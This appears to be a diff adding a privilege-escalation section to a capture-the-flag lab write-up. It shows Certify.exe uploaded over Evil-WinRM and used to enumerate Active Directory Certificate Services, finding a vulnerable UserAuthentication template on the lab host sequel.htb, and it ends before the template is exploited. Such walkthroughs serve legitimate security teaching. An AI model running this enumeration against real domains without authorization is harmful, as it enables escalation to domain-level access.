@@ -582,3 +582,69 @@ d94615721bdc257a6576b20fbbxxxxxx
 # Privilege Escalation: Ryan.Cooper -> NT AUTHORITY\SYSTEM
 
 <br />
+
+### ADCS:
+
+<br />
+
+Whenever we compromise a Windows machine, one thing we should always check is the presence of `ADCS` (Active Directory Certificate Services).
+
+This thing is the `ADCS` (Active Directory Certificate Services).
+
+<br />
+
+To do this, we'll upload the [Certify.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) binary:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> upload certify.exe
+                                        
+Info: Uploading /opt/certify.exe to C:\Users\Ryan.Cooper\Desktop\certify.exe
+                                        
+Data: 232104 bytes of 232104 bytes copied
+                                        
+Info: Upload successful!
+```
+
+<br />
+
+Then, we execute it to look for vulnerable certificate templates:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> .\certify.exe find /vulnerable
+```
+
+<br />
+
+The output reveals valuable information, including a vulnerable certificate template:
+
+<br />
+
+```bash
+[!] Vulnerable Certificate Templates:
+
+    CA Name                               : dc.sequel.htb\sequel-DC-CA
+    Template Name                         : UserAuthentication
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights                 : sequel\Domain Admins
+                                            sequel\Domain Users
+                                            sequel\Enterprise Admins
+```
+
+<br />
+
+Perfect! We’ve identified a vulnerable template named `UserAuthentication`.
+
+
